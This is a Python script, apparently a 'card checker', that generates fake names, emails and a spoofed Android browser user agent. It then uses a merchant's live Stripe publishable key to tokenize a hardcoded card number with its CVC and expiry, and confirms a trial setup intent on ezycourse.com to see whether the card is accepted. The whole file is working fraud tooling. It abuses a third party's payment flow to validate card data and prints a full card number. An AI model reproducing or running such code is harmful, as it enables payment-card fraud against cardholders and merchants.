import requests
import re
import time
import random
import base64
from faker import Faker
from user_agent import generate_user_agent

x = Faker()
n = x.name()
r = requests.Session()
u = generate_user_agent()

def python():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()
    
e = python()

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = 'type=card&card[number]=4802138766607576&card[cvc]=499&card[exp_month]=12&card[exp_year]=29&payment_user_agent=stripe.js%2F19f3ad3143%3B+stripe-js-v3%2F19f3ad3143%3B+card-element&key=pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq'

response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
uwu = response.json()['id']

headers = {
    'authority': 'ezycourse.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://ezycourse.com',
    'referer': 'https://ezycourse.com/signup?plan=pro&interval=month&trial=true',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
}

json_data = {
    'stripe_payment_method_uuid': uwu,
    'is_trial': True,
}

response = r.post(
    'https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent',
    cookies=r.cookies,
    headers=headers,
    json=json_data,
)

try:
    data = response.json()
    if 'id' in data and 'client_secret' in data:
        uwu2 = data['id']
        uwu3 = data['client_secret']
    else:
        print(response.text)
        uwu2 = None
        uwu3 = None
except:
    print(response.text)
    uwu2 = None
    uwu3 = None

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq&client_secret={uwu3}'

response = r.post(
    f'https://api.stripe.com/v1/setup_intents/{uwu2}/confirm',
    headers=headers,
    data=data,
)

print(response.text)